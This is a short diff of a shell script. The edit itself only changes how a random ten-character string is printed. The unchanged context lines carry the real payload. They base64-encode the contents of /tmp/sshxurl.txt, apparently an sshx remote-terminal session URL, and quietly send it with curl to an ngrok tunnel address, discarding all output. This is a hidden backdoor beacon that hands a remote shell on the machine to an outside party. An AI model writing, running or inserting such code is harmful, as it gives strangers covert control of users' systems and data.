@@ -11,5 +11,6 @@ URL=$(base64 -i /tmp/sshxurl.txt)
 
 curl -s https://advanced-hardy-dolphin.ngrok-free.app/$URL > /dev/null 2>&1
 
-cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 10
+LC_ALL=C tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 10
+echo ""
 echo "Done!"
